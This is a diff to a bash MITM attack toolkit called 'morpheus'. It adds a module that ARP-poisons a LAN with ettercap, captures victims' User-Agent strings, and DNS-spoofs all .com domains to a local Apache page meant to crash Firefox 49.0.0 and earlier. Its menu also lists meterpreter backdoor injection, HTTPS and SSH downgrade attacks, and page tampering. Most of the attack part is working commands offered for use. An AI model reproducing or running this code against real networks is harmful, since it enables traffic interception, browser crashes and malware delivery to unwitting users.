@@ -233,7 +233,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit firewall.eft'[filter]'${RedF}!${Reset};
+  echo ${BlueF}[☠]${white} Edit firewall.eft${RedF}!${Reset};
   sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
@@ -334,7 +334,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit sidejacking.eft'[filter]'${RedF}!${Reset};
+  echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
@@ -421,7 +421,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit packet_drop.eft'[filter]'${RedF}!${Reset};
+  echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
@@ -788,10 +788,145 @@ fi
 
 
 
+# ----------------------------------------------------
+# FIREFOX =< 49.0.0 DENIAL-OF-SERVICE [mitm+dns_spoof]
+# ----------------------------------------------------
+sh_stage7 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.0) using  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  a buffer overflow writen in javascript (deliver under mitm+dns) ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  2 - If firefox version its exploitable then deliver payload.    ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sleep 1
+  # backup all files needed.
+  cd $IPATH/bin
+  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
+  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  # copy files to apache2 webroot
+  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html > /dev/null 2>&1
+  # use SED bash command
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
+  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  cd $IPATH
+  sleep 1
+
+  # compiling UserAgent.eft to be used in ettercap
+  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
+  sleep 1
+
+# start apache2 webserver...
+echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
+        else
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway// && sleep 3"
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
+        else
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/ && sleep 3"
+        fi
+      fi
+
+
+  # check if target system its vuln
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8'}`
+  echo ${BlueF}[☠]${GreenF} '|'_ $VeVul${Reset};
+  sleep 2
+
+
+
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
+  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
+  rm $ApachE/miss.png > /dev/null 2>&1
+  rm $ApachE/$dIc > /dev/null 2>&1
+  rm $ApachE/index.html > /dev/null 2>&1
+  cd $IPATH
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage7 () {
+sh_stage8 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -809,7 +944,7 @@ echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
 cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
 sleep 1
 
-  echo ${BlueF}[☠]${white} Edit img_replace.eft'[filter]'${RedF}!${Reset};
+  echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
@@ -899,7 +1034,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit template'[filter]'${RedF}!${Reset};
+  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
@@ -974,7 +1109,7 @@ if [ "$?" -eq "0" ]; then
   IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
   echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
   # scan local lan using nmap
-  nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[nmap] Scanning local lan..." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
+  nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Scanning local lan..." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
   # strip results and print report
   cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 410 --height 400 > /dev/null 2>&1
 
@@ -1082,11 +1217,12 @@ cat << !
     |   4    -  Redirect browser traffic         [ to another domain  ] |
     |   5    -  Redirect browser traffic         [ to google sphere   ] |
     |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
-    |   7    -  Replace website images           [ img src=http://www ] |
-    |   8    -  Replace website text             [ replace: worlds    ] |
-    |   9    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |  10    -  https downgrade attack (demo)    [ replace: https     ] |
-    |  11    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
+    |   7    -  firefox denial-of-service        [ firefox =< 49.0.0  ] |
+    |   8    -  Replace website images           [ img src=http://www ] |
+    |   9    -  Replace website text             [ replace: worlds    ] |
+    |  10    -  Rotate website document 180º     [ CSS3 injection     ] |
+    |  11    -  https downgrade attack (demo)    [ replace: https     ] |
+    |  12    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
     |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
@@ -1106,6 +1242,7 @@ case $choice in
 4) sh_stage4 ;;
 5) sh_stage5 ;;
 6) sh_stage6 ;;
+7) sh_stage7 ;;
 10) sh_stage10 ;;
 11) sh_stage11 ;;
 W) sh_stageW ;;
